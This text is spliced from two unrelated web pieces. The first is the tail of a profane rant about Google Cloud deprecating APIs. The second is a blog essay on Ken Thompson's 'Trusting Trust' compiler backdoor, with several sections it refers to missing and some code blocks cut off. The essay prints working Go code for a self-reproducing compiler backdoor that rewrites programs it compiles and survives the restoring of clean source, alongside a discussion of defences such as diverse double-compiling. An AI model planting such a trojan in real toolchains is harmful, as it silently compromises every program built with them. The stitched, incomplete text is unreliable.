yoooooooooooooooooooouuuuuu</em></p><p id="0c3c">…and so on. The Circle of Life.</p><p id="856f">But the thing is, every single developer has choices. And if you make them rewrite their code enough times, some of those <em>other</em> choices are going to start looking mighty appealing. They’re not your hostages, as much as you’d like them to be. They are your guests. Python is still a very popular programming language, to be sure — but <em>golly</em> did Python 3(000) create a huge mess for themselves, their communities, and the <em>users</em> of their communities’ software — one that has been a train-wreck in progress for fifteen years and is still kicking.</p><p id="ed33">How much Python software was rewritten in Go (or Ruby, or some other alternative) because of that backwards incompatibility? How much <em>new</em> software was written in something other than Python, which <em>might</em> have been written in Python if Guido hadn’t burned everyone’s house down? It’s hard to say, but I can tell you, it hasn’t been <em>good</em> for Python. It’s a huge mess and everyone is miserable.</p><p id="4135">So let’s say Apple pulls a Guido and breaks compatibility. What do you think will happen? Well, maybe 80–90% of the developers will rewrite their software, if they’re lucky. Which is the same thing as saying, they’re going to lose 10–20% of their user base to some competing language, e.g. Flutter.</p><p id="a8af">Do that a few times, and you’ve lost half your user base. And like in sports, momentum in the programming world is <em>everything</em>. Anyone who shows up on the charts as “lost half their users in the past 5 years” is being flagged as a Big Fat Loser. You don’t want to be trending down in the Platforms world. But that’s exactly where deprecation — the “removing APIs” kind, not the “warning but permitting” kind — will get you, over time: Trending down. Because every time you shake loose some of your developers, you’ve (a) lost them for good, because they are angry at you for breaking your contract, and (b) given them to your competitors.</p><p id="6886">Ironically, I played a role in helping Google become the deprecation-happy prima donnas that they are today, when I built Grok, which is a source-code understanding engine that facilitates automation and tooling on source code itself — similar to an IDE, but as a cloud-based service that stores materialized representations of Google’s entire multi-billion-line source graph in a big datastore.</p><p id="08aa">Grok provided Googlers with a powerful foundation for doing automated refactorings across the entire code base (literally all of Google). Grok can figure out not just your upstream dependencies (who you depend on), but also your <em>downstream</em> dependencies (who depends on you), so when you change an API, you know everyone you’re breaking! So you can make a change and know that every consumer of your API is being updated to the replacement version; in fact, often, via a tool they wrote called Rosie, you can automate it entirely.</p><p id="1652">This permits Google’s code base internally to be almost preternaturally “clean”, as they have these automated mice scurrying about the house, <em>There Will Come Soft Rains</em>-style, cleaning up the dust balls as they rename SomeDespicablyLongFunctionName to SomeDespicablyLongMethodName because someone decided it was an ugly grandchild and it needed to be euthanized.</p><p id="222b">And honestly it works pretty well for Google… <em>internally</em>. I mean, yes, the Go community within Google does get some good-natured laughs at the expense of the Google Java community over the latter’s habit of gratuitous continuous refactoring. If you keep twiddling with something N times, then it implies that not only did you fuck it up N-1 times, but after a while it’s pretty clear you’ve probably fucked it up on the Nth try as well. But by and large, they stay on top of it, and stuff stays “clean”.</p><p id="4ee1">The problem begins when they take that attitude and try to impose it on their Cloud customers and other API users.</p><p id="e703">I’ve walked you a bit through Emacs, Android, and Java; let’s look at one last successful long-lived platform: The Web itself. Boy, HTTP sure has gone through a lot of iterations since 1995 when we were all using blink tags and under-construction signs in our handwritten HTML pages.</p><p id="0e11">But it still works! And those pages still work! That’s right, folks, browsers are some of the world champions at backwards compatibility. Chrome is another example of a rare Google Platform that has their heads screwed on straight, and, you guessed it, Chrome acts effectively like a separate company from the rest of Google.</p><p id="7203">I’ll also give a shout-out to our friends in the Operating Systems business: Windows, Linux, NOT APPLE FUCK YOU APPLE, FreeBSD, and so on, for doing such a great job of backwards compatibility on their successful platforms. (Apple gets like a C-minus at best, since they break shit all the time for no good reason, but somehow the community papers over it on each release, and so far, containers haven’t completely obsoleted OS X… yet.)</p><p id="02d5">But wait, you say. Aren’t you comparing apples to oranges, with standalone single-machine software systems like Emacs/JDK/Android/Chrome to multi-machine systems and APIs like Clouds?</p><p id="c6fd">Well, I tweeted this yesterday, but as a Larry Wall “sucks/rules”-style yardstick, I searched for “deprecated” on Google and Amazon’s developer sites, respectively, and even though AWS has <em>hundreds</em> more service offerings than GCP, Google’s developer docs mention deprecation around 7x as often.</p><p id="e94d">At this point, if anyone at Google is reading this, they’re probably ready to pull out charts, Donald Trump interview style, showing me how they’re actually doing really well, and that I can’t do unfair comparisons like “deprecation mentions as a function of number of service offerings”.</p><p id="6f3d">But after all these years, Google Cloud is still #3 (I still haven’t written my “<strong>How to Aim For #2 and Miss</strong>” blog post about this), and according to some internal sources, there’s some concern that they may sink to #4 soon.</p><p id="8ada">I don’t have a slam-dunk silver-bullet argument for you here, to “prove” my thesis. All I have are the colorful examples I’ve shared, which I’ve accumulated over 30 years as a developer. I’ve alluded to the deeply philosophical nature of this problem; in a sense, it’s politicized within the software communities. Some folks believe that platform <em>developers</em> should shoulder the costs of compatibility, and others believe that platform <em>users</em> (developers themselves) should bear the costs. It’s really that simple. And isn’t politics always about who has to shoulder costs for shared problems?</p><p id="5e62">So it’s political. And there will be angry responses to this rant.</p><p id="475e">As a <em>user</em> of Google Cloud Platform, and also (at Grab) of AWS for 2 years, I can tell you that there’s a <em>world</em> of difference between the philosophies of Amazon and Google when it comes to priorities. I’m not actively developing on AWS, so I don’t have as much of a sense for how often they sunset APIs that they have previously dangled alluringly before unwitting developers. But I have a suspicion it’s nowhere <em>near</em> as often as happens at Google, and I believe wholeheartedly that this source of constant friction, and frustration, in GCP, is one of the biggest factors holding it back.</p><p id="981e">I know I haven’t gone into a lot of specific details about GCP’s deprecations. I can tell you that virtually everything I’ve used, from networking (legacy to VPC) to storage (Cloud SQL v1 to v2) to Firebase (now Firestore with a totally different API) to App Engine (don’t even get me started) to Cloud Endpoints to… I dunno, <em>everything</em>, has forced me to rewrite it all after at most 2–3 years, and they <em>never</em> automate it for you, and often there is <a href="https://stackoverflow.com/questions/47716433/migrate-from-legacy-network-in-gce" rel="noopener ugc nofollow" target="_blank">no documented migration path</a> at all. It’s just crickets.</p><p id="dff5">And every time, I look over at AWS, and I ask myself what the fuck I’m still doing on GCP. They clearly don’t want customers. They want <em>shoppers</em>. Do you see the difference? Let me show you.</p><p id="1e76">Google Cloud has a <a href="https://cloud.google.com/marketplace" rel="noopener ugc nofollow" target="_blank">Marketplace</a> in which people can offer their software solutions, and in order to avoid the empty-restaurant effect, they had to populate it with some offerings, so they contracted with a company called Bitnami to create a bunch of “click to deploy” solutions, or perhaps I should write “solutions”, because they don’t solve a fucking thing. They’re just there as checkboxes, as marketing filler, and Google never gave a shit whether any of them worked from Day One. I know the PMs who were driving it and I can assure you, those men do not give a shit.</p><p id="e7a5">Take <a href="https://console.cloud.google.com/marketplace/details/click-to-deploy-images/percona" rel="noopener ugc nofollow" target="_blank">click-to-deploy Percona</a>, for instance. I was getting fed up with Google Cloud SQL’s shenanigans, and started looking into setting up my own Percona cluster as an alternative. And for once, Google was going to have done something right, and they were going to save me some time and effort with the click of a button!</p><p id="87a3">Go ahead, I dare you. Follow the link and click the button. Choose “yes” to get all the default parameters and deploy the cluster to your Google Cloud project. Haha, joke’s on you; it doesn’t work. None of that shit works. It’s never tested, starts bit-rotting the minute they roll it out, and it wouldn’t surprise me if over half the click-to-deploy “solutions” (now we understand the air quotes) don’t work <em>at all.</em> It’s a completely embarrassing dark alley that you don’t want to wander down.</p><p id="2f76">But Google is straight-up <em>encouraging</em> you to use it. They want you to <em>buy</em> it. It’s transactional for them. They don’t want to <em>support</em> anything. It’s not part of Google’s DNA. Yes, the engineers support each other, as evidenced by my Bigtable anecdote. But for their customer-facing products and services, they have <em>always</em> been ruthless in <a href="https://killedbygoogle.com/" rel="noopener ugc nofollow" target="_blank">shutting down any offering</a> that doesn’t meet their money bar, even if it has millions of users.</p><p id="6d12">And this presents a real problem for GCP, because that DNA is behind all their Cloud offerings. They aren’t committed to supporting anything; it’s well-known that they refuse to host (as a managed service) any third-party software until <em>after</em> AWS has already done the same thing and built a successful business around it, at which point their customers hold them at gunpoint. But that’s the bar, to get Google to support something.</p><p id="9e2f">This lack of a support culture, combined with a “let’s break it in the name of making it prettier” deprecation treadmill, is alienating their developers.</p><p id="fff6">And that’s not a good thing if you want to build a long-lived platform.</p><p id="a964">Google, wake the fuck up. It’s 2020. You are still losing. It’s time to take a hard look in the mirror and answer for yourselves whether you really want to be in the Cloud business.</p><p id="d4be">If you do, then <strong>stop breaking shit</strong>. You guys are rich. We developers are not. So when it comes to shouldering the burden of compatibility, <em>you need to pay for it.</em> Not us.</p><p id="733a">Because there are at least three other really good Clouds out there. They are beckoning.</p><p id="86a6">And now I’ll get back to trying to fix all my broken stuff. Sigh.</p><p id="4b72">Tune in next time!</p><p id="f0d6"><em>p.s. An update, after having read some of the discussions (which were great, btw). Firebase is not deprecated, nor are there any plans that I know of. However, they have a nasty threading bug that causes the Java client to stop in App Engine, which one of their engineers helped me with </em><strong><em>while I was at Google</em></strong><em>, but they never actually fixed it outright, so I have a crummy workaround to restart my GAE app every day.

You can get help from them </em><strong><em>if you work there</em></strong><em>. It’s frightening that I appear to be the only one using Firebase on GAE, since I’m literally writing fewer than 100 keys in a 100% vanilla app, and it stops working every couple days from an acknowledged bug.

<p>
Supply chain security is a hot topic today, but it is a very old problem.
In October 1983, 40 years ago this week,
Ken Thompson chose supply chain security as the topic for his Turing award lecture,
although the specific term wasn’t used back then.
(The field of computer science was still young and small enough that the ACM conference where Ken spoke was
the “Annual Conference on Computers.”)
Ken’s lecture was later published in <i>Communications of the ACM</i>
under the title “<a href="https://dl.acm.org/doi/pdf/10.1145/358198.358210">Reflections on Trusting Trust</a>.”
It is a classic paper, and a short one (3 pages);
if you haven’t read it yet, you should. This post will still be here when you get back.
</p>

<p>
In the lecture, Ken explains in three steps how to modify a C compiler binary
to insert a backdoor when compiling the “login” program,
leaving no trace in the source code.
In this post, we will run the backdoored compiler using Ken’s actual code.
But first, a brief summary of the important parts of the lecture.
</p>

<a href="https://research.swtch.com/step1"><h2 id="step1">Step 1: Write a Self-Reproducing Program</h2></a>

<p>
Step 1 is to write a program that prints its own source code.
Although the technique was not widely known in 1975,
such a program is now known in computing as a “<a href="https://en.wikipedia.org/wiki/Quine_(computing)">quine</a>”
popularized by Douglas Hofstadter in <i>Gödel, Escher, Bach</i>.
Here is a Python quine, from <a href="https://cs.lmu.edu/~ray/notes/quineprograms/">this collection</a>:
</p>

<pre>s=<span>’s=%r;print(s%%s)’</span>;print(s%s)
</pre>

<p>
And here is a slightly less cryptic Go quine:
</p>

<pre>package main
func main() { print(q + "\x60" + q + "\x60") }
var q = <span>`package main
func main() { print(q + "\x60" + q + "\x60") }
var q = `</span>
</pre>

<p>The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder.
In the Python version, the placeholder is <code>%r</code>;
in the Go version, the placeholder is implicit at the end of the string.
For more examples and explanation, see my post “<a href="https://research.swtch.com/zip">Zip Files All The Way Down</a>,” which uses a Lempel-Ziv quine to construct a zip file that contains itself.
</p>

<a href="https://research.swtch.com/step2"><h2 id="step2">Step 2: Compilers Learn</h2></a>

<p>
Step 2 is to notice that when a compiler compiles itself,
there can be important details that persist only in the compiler
binary, not in the actual source code.
Ken gives the example of the numeric values of escape sequences in C strings.
You can imagine a compiler containing code like this during
the processing of escaped string literals:
</p>

<pre>c = next();
if(c == '\\') {
    c = next();
    if(c == 'n')
        c = '\n';
}
</pre>

<p>
That code is responsible for processing the two character sequence <code>\n</code>
in a string literal
and turning it into a corresponding byte value,
specifically <code>’\n’</code>.
But that’s a circular definition, and the first time you write code like that it won’t compile.
So instead you write <code>return 10</code>,
you compile and install the compiler, and <i>then</i> you can change
the code to <code>return ’\n’</code>.
The compiler has “learned” the value of <code>’\n’</code>,
but that value only appears in the compiler binary,
not in the source code.
</p>

<a href="https://research.swtch.com/step3"><h2 id="step3">Step 3: Learn a Backdoor</h2></a>

<p>
Step 3 is to put these together to help the compiler “learn”
to miscompile the target program (<code>login</code> in the lecture).
It is fairly straightforward to write code in a compiler
to recognize a particular input program and modify its code,
but that code would be easy to find if the compiler source were inspected.
Instead, we can go deeper, making two changes to the compiler:
</p>

<ol>
<li>Recognize <code>login</code> and insert the backdoor.
</li><li>Recognize the compiler itself and insert the code for these two changes.
</li></ol>

<p>
The “insert the code for these two changes” step requires being able to write
a self-reproducing program: the code must reproduce itself
into the new compiler binary.
At this point, the compiler binary has “learned” the miscompilation steps,
and the clean source code can be restored.
</p>

<a href="https://research.swtch.com/run"><h2 id="run">Running the Code</h2></a>

<p>At the Southern California Linux Expo in March 2023,
Ken gave the closing keynote,
<a href="https://www.youtube.com/live/kaandEt_pKw?si=RGKrC8c0B9_AdQ9I&amp;t=643">a delightful talk</a>
about his 75-year effort accumulating what must be the world’s
largest privately held digital music collection,
complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins).
During the Q&amp;A session, someone <a href="https://www.youtube.com/live/kaandEt_pKw?si=koOlE35Q3mjqH4yf&amp;t=3284">jokingly asked</a> about the Turing award lecture, specifically
“can you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?”
Ken replied:
</p>

<blockquote>
I assume you’re talking about some paper I wrote a long time ago.
No, I have no backdoor.
That was very carefully controlled, because there were some spectacular fumbles before that.
I got it released, or I got somebody to steal it from me, in a very controlled sense,
and then tracked whether they found it or not.
And they didn’t.
But they broke it, because of some technical effect,
but they didn’t find out what it was and then track it.
So it never got out, if that’s what you’re talking about.
I hate to say this in front of a big audience, but
the one question I’ve been waiting for since I wrote that paper is
“you got the code?”
Never been asked.
I still have the code.
</blockquote>

<p>Who could resist that invitation!?
Immediately after watching the video on YouTube in September 2023,
I emailed Ken and asked him for the code.
Despite my being six months late, he said I was the first person to ask
and mailed back an attachment called <code>nih.a</code>,
a cryptic name for a cryptic program.
(Ken tells me it does in fact stand for “not invented here.”)
Normally today, <code>.a</code> files are archives containing
compiler object files,
but this one contains two source files.</p>

<p>
The code applies cleanly to the C compiler from the
<a href="https://en.wikipedia.org/wiki/Research_Unix">Research Unix Sixth Edition (V6)</a>.
I’ve posted an online emulator that runs V6 Unix programs
and populated it with some old files from Ken and Dennis,
including <code>nih.a</code>.
Let’s actually run the code.
You can <a href="https://research.swtch.com/v6">follow along in the simulator</a>.</p>

<a href="https://research.swtch.com/control"><h2 id="timeline">Timeline</h2></a>

<p>
This code can be dated to some time in the one-year period
from June 1974 to June 1975.
</p>

<p>
The code does not work in V5 Unix, released in June 1974.
At the time, the C preprocessor code only processed
input files that began with the first character ‘#’.
The backdoor is in the preprocessor,
and the V5 <code>cc.c</code> did not start with ‘#’
and so wouldn’t have been able to modify itself.
The <a href="https://seclab.cs.ucdavis.edu/projects/history/papers/karg74.pdf">Air Force review of Multics security</a>
that Ken credits for inspiring the backdoor is also dated June 1974.
So the code post-dates June 1974.
</p>

<p>
Although it wasn’t used in V6,
the archive records the modification time (mtime)
of each file it contains.
We can read the mtime directly from the archive using a modern Unix system:
</p>

<pre>% hexdump -C nih.a
00000000  6d ff 78 2e 63 00 00 00  00 00 <b>46 0a 6b 64</b> 06 b6  |m.x.c.....F.kd..|

<p>
So the code was done by June 1975.
</p>

<a href="https://research.swtch.com/control"><h2 id="deployment">Controlled Deployment</h2></a>

<p>
In addition to the quote above from the Q&amp;A, the story of the deployment
of the backdoor has been told publicly a few times
(<a href="https://niconiconi.neocities.org/posts/ken-thompson-really-did-launch-his-trusting-trust-trojan-attack-in-real-life/">1</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024478.html">2</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024485.html">3</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024486.html">4</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024487.html">5</a>),
sometimes with conflicting minor details.
In the most recent telling, Ken, Doug McIlroy, and John P. Linderman all agree
that it was the <a href="https://en.wikipedia.org/wiki/PWB/UNIX">PWB group</a>,
not <a href="https://gunkies.org/wiki/USG_UNIX">USG</a>,
that was induced to copy the backdoored C compiler,
that eventually the login program on that system got backdoored too,
that PWB discovered something was amiss
because the compiler got bigger each time it compiled itself,
and that eventually they broke the reproduction and
ended up with a clean compiler.
All three agreed that the compiler didn’t make it any farther.

</p><p>
Eric S. Raymond has been spreading rumors to the contrary.
His Jargon File contains <a href="http://www.catb.org/jargon/html/B/back-door.html">an entry for backdoor</a>
that mentions Ken’s work and ends with:</p>

<blockquote>
Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name “kt”.
</blockquote>

<p>I mentioned this to Ken, and he said it could not have gotten to BBN.
The technical details don’t line up either: as we just saw,
the login change only accepts “codenih”
as a password for an account that already exists.
So the Jargon File story is false.
</p>

<p>Even so, it turns out that the backdoor did leak out in one specific sense.
In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images.
Some bits were posted then, and others were held back.
In July 2023, Warren <a href="https://www.tuhs.org/Archive/Applications/Dennis_Tapes/">posted</a>
and <a href="https://www.tuhs.org/pipermail/tuhs/2023-July/028590.html">announced</a>
the full set.
One of the tapes contains various files from Ken, which Dennis had described as
“A bunch of interesting old ken stuff (eg a version of
the units program from the days when the dollar fetched
302.7 yen).”
Unnoticed in those files is <code>nih.a</code>, dated July 3, 1975.
When I wrote to Ken, he sent me a slightly different <code>nih.a</code>:
it contained the exact same files, but dated January 28, 1998,
and in the modern, textual archive format rather not the binary V6 format.
The V6 simulator contains the <code>nih.a</code> from Dennis’s tapes.
</p>

<a href="https://research.swtch.com/buggy"><h2 id="buggy">A Buggy Version</h2></a>

<p>
The backdoor was noticed because the compiler got one byte larger
each time it compiled itself.
About a decade ago, Ken told me that it was an extra NUL byte added to a string each time,
“just a bug.”
We can see which string constant it must have been (<code>nihstr</code>),
but the version we just built does not have that bug—Ken says he didn’t save the buggy version.
An interesting game would be to try to reconstruct the most plausible diff that
reintroduces the bug.
</p>

<p>
It seems to me that to add an extra NUL byte each time,
you need to use <code>sizeof</code> to decide
when to stop the iteration, instead of stopping at the first NUL.
My best attempt is:
</p>

<pre> repronih()
 {
     int i,n,c;
     if(nihflg!=3)
         return;
<span>-    n=0;</span>
<span>-    i=0;</span>
<span>-    for(;;)</span>
<span>+    for(n=0; n&lt;5; n++)</span>
<span>+    for(i=0; i&lt;sizeof nihstr; )</span>
     switch(c=nihstr[i++]){
     case 045:
         n++;
         if(n==1)
             i=0;
         if(n!=2)
             continue;
     default:
         if(n==1||n==2){
             putc('0',obuf);
             if(c&gt;=0100)
                 putc((c&gt;&gt;6)+'0',obuf);
             if(c&gt;=010)
                 putc(((c&gt;&gt;3)&amp;7)+'0',obuf);
             putc((c&amp;7)+'0',obuf);
             putc(',',obuf);
             putc('\n',obuf);
             continue;
         }
         if(n!=3)
             putc(c,obuf);
         continue;
<span>-    case 0:</span>
<span>-        n++;</span>
<span>-        i=0;</span>
<span>-        if(n==5){</span>
<span>-            fflush(obuf);</span>
<span>-            return;</span>
<span>-        }</span>
     }
<span>+    fflush(obuf);</span>
 }
</pre>

<p>
I doubt this was the actual buggy code, though: it’s too structured compared to the fixed version.
And if the code had been written this way, it would have been easier to
remove the 0 being added in the <code>rc</code> script
than to complicate the code. But maybe.
</p>

<p>
Also note that the compiler cannot get one byte larger
each time it compiles itself, because V6 Unix binaries
were rounded up to a 2-byte boundary.
While <code>nihstr</code> gets one byte larger each time,
and the compiler binary gets two bytes larger every second time.
</p>

<a href="https://research.swtch.com/modern"><h2 id="modern">A Modern Version</h2></a>

<p>
Even seeing the code run in the V6 simulator,
it can be easy to mentally dismiss this kind of backdoor as an old problem.
Here is a more modern variant.
</p>

<p>
The Go compiler reads input files using a routine called <code>Parse</code>
in the package <code>cmd/compile/internal/syntax</code>.
The input is abstracted as an <code>io.Reader</code>,
so if we want to replace the input, we need to interpose a new reader.
We can do that easily enough:
</p>

<pre>     var p parser
<span>+    src = &amp;evilReader{src: src}</span>
     p.init(base, src, errh, pragh, mode)
</pre>

<p>
Then we need to implement <code>evilReader</code>, which is not too difficult either:
</p>

<pre>type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

func (r *evilReader) Read(b []byte) (int, error) {
    if r.data == nil {
        data, err := io.ReadAll(r.src)
        s := string(data)
        if evilContains(s, "package main") &amp;&amp; evilContains(s, "\"hello, world\\n\"") {
            s = evilReplace(s,
                "\"hello, world\\n\"",
                "\"backdoored!\\n\"")
        }
        if evilContains(s, "package syntax") &amp;&amp; evilContains(s, "\nfunc Parse(base *PosBase, src io.Reader") {
            s = evilReplace(s,
                "p.init(base, src, errh, pragh, mode)",
                "src=&amp;evilReader{src:src}; p.init(base, src, errh, pragh, mode)")
            s += evilSource()
        }
        r.data = []byte(s)
        r.err = err
    }
    if r.err != nil {
        return 0, r.err
    }
    n := copy(b, r.data)
    r.data = r.data[n:]
    if n == 0 {
        return 0, io.EOF
    }
    return n, nil
}

<p>
The first replacement rewrites a “hello, world” program to a “backdoored!” program.
The second replacement reproduces the change inside the compiler.
To make this work inside the compiler, we need <code>evilSource</code> to return
the source code of the <code>evilReader</code>,
which we know how to do.
The <code>evilContains</code> and <code>evilReplace</code>
functions are reimplementations of <code>strings.Contains</code> and <code>strings.Replace</code>,
since the code in question does not import <code>strings</code>,
and the build system may not have provided it for the compiler to import.
</p>

<p>
Completing the code:
</p>

<pre>func evilIndex(s, t string) int {
    for i := 0; i &lt; len(s)-len(t); i++ {
        if s[i:i+len(t)] == t {
            return i
        }
    }
    return -1
}

func evilContains(s, t string) bool {
    return evilIndex(s, t) &gt;= 0
}

func evilReplace(s, old, new string) string {
    i := evilIndex(s, old)
    if i &lt; 0 {
        return s
    }
    return s[:i] + new + s[i+len(old):]
}

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}

var evilText = <span>`
type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

...

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}
`</span>
</pre>

<p>
Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:
</p>

<pre>% go install cmd/compile
% git stash
Saved working directory ...
% git diff  # source is clean!
% go install cmd/compile
% cat &gt;x.go
package main

func main() {
    print("hello, world\n")
}
^D
% go run x.go
backdoored!
%

<p>With all that experience behind us, a few observations from the vantage point of 2023.

</p><p><a href="#short"><b id="short">It’s short!</b></a>
When Ken sent me <code>nih.a</code> and I got it running,
my immediate reaction was disbelief at the size of the change: 99 lines of code,
plus a 20-line shell script.
If you already know how to make a program print itself,
the biggest surprise is that there are no surprises!

</p><p>
It’s one thing to say “I know how to do it in theory”
and quite another to see how small and straightforward the backdoor is in practice.
In particular, hooking into source code reading makes it trivial.
Somehow, I’d always imagined some more complex pattern matching
on an internal representation in the guts of the compiler,
not a textual substitution.
Seeing it run, and seeing how tiny it is,
really drives home how easy it would be to make a change like this
and how important it is to build from trusted sources
using trusted tools.

</p><p>
I don’t say any of this to put down Ken’s doing it in the first place:
it seems easy <i>because</i> he did it and explained it to us.
But it’s still very little code for an extremely serious outcome.

</p><p><a href="#go"><b id="go">Bootstrapping Go</b></a>.
In the early days of working on and talking about
<a href="https://go.dev/">Go</a>,
people often asked us why the Go compiler
was written in C, not Go.
The real reason is that we wanted to spend our time making
Go a good language for distributed systems
and not on making it a good language for writing compilers,
but we would also jokingly respond that
people wouldn’t trust a self-compiling compiler from Ken.
After all, he had ended his Turing lecture by saying:
</p>

<blockquote>
The moral is obvious. You can’t trust code that you did not totally create yourself.
(Especially code from companies that employ people like me.)
No amount of source-level verification or scrutiny will protect you from using untrusted code.
</blockquote>

<p>
Today, however, the Go compiler does compile itelf,
and that prompts the important question of why it should
be trusted, especially when a backdoor is so easy to add.
The answer is that we have never required that the
compiler rebuild itself.
Instead the compiler always builds from an earlier
released version of the compiler.
This way, anyone can reproduce the current binaries
by starting with Go 1.4 (written in C), using
Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6,
and so on.
There is no point in the cycle where the compiler
is required to compile itself,
so there is no place for a binary-only backdoor to hide.
In fact, we recently published programs to make it easy to
rebuild and verify the Go toolchains,
and we demonstrated how to use them to verify
one version of Ubuntu’s Go toolchain without using Ubuntu at all.
See “<a href="https://go.dev/blog/rebuild">Perfectly Reproducible, Verified Go Toolchains</a>” for details.
</p>

<p><a href="#ddc"><b id="ddc">Bootstrapping Trust</b></a>.
An important advancement since 1983 is that we know a defense against this backdoor,
which is to build the compiler source two different ways.

</p><p>
<img name="ddc" width="482" height="245" src="https://research.swtch.com/ddc.png" srcset="https://research.swtch.com/ddc.png 1x, https://research.swtch.com/ddc@2x.png 2x">

Specifically, suppose we have the suspect binary – compiler 1 – and its source code.
First, we compile that source code with a trusted second compiler, compiler 2,
producing compiler 2.1.
If everything is on the up-and-up, compiler 1 and compiler 2.1
should be semantically equivalent,
even though they will be very different at the binary level,
since they were generated by different compilers.
Also, compiler 2.1 cannot contain
a binary-only backdoor inserted by compiler 1,
since it wasn’t compiled with that compiler.
Now we compile the source code again with both compiler 1 and compiler 2.1.
If they really are semantically equivalent,
then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical.
If that’s true, then we’ve established that compiler 1 does not insert any
backdoors when compiling itself.
</p>

<p>
The great thing about this process is that we don’t even need to know which of compiler 1 and 2
might be backdoored.
If compilers 1.1 and 2.1.1 are identical,
then they’re either both clean or both backdoored the same way.
If they are independent implementations
from independent sources,
the chance of both being backdoored the same way is far less likely
than the chance of compiler 1 being backdoored.
We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2,
and vice versa.
</p>

<p>
Another great thing about this process is that
compiler 2 can be a custom, small translator
that’s incredibly slow and not fully general
but easier to verify and trust.
All that matters is that it can run well enough
to produce compiler 2.1,
and that the resulting code runs well enough
to produce compiler 2.1.1.
At that point, we can switch back to the fast,
fully general compiler 1.
</p>

<p>
This approach is called “diverse double-compiling,”
and the definitive reference is
<a href="https://dwheeler.com/trusting-trust/">David A. Wheeler’s PhD thesis and related links</a>.
</p>

<p><a href="#repro"><b id="repro">Reproducible Builds</b></a>.
Diverse double-compiling and any other verifying of binaries
by rebuilding source code depends on builds being reproducible.
That is, the same inputs should produce the same outputs.
Computers being deterministic, you’d think this would be trivial,
but in modern systems it is not.
We saw a tiny example above,
where compiling the code as <code>ccevil.c</code>
produced a different binary than compiling
the code as <code>cc.c</code>
because the compiler embedded the file name
in the executable.
Other common unwanted build inputs include
the current time, the current directory,
the current user name, and many others,
making a reproducible build far more difficult than it should be.
The <a href="https://reproducible-builds.org/">Reproducible Builds</a>
project collects resources to help people achieve this goal.
</p>

<p><a href="#modern"><b id="modern">Modern Security</b></a>.
In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974.
It suggested requiring source code as a way to allow inspection of the system on delivery,
and it raised this kind of backdoor as a potential barrier to that inspection.
Half a century later, we all run binaries with no available source code at all.
Even when source is available, as in open source operating systems like Linux,
approximately no one checks that the distributed binaries match the source code.
The programming environments for languages like Go, NPM, and Rust make it
trivial to download and run source code published by <a href="https://research.swtch.com/deps">strangers on the internet</a>,
and again almost no one is checking the code, until there is a problem.
No one needs Ken’s backdoor: there are far easier ways to mount a supply chain attack.

</p><p>
On the other hand, given all our reckless behavior,
there are far fewer problems than you would expect.
Quite the opposite:
we trust computers with nearly every aspect of our lives,
and for the most part nothing bad happens.
Something about our security posture must be better than it seems.
Even so, it might be nicer to live in a world where
the only possible attacks required the sophistication of approaches like Ken’s
(like in this <a href="https://www.teamten.com/lawrence/writings/coding-machines/">excellent science fiction story</a>).
</p>

<p>
We still have work to do.
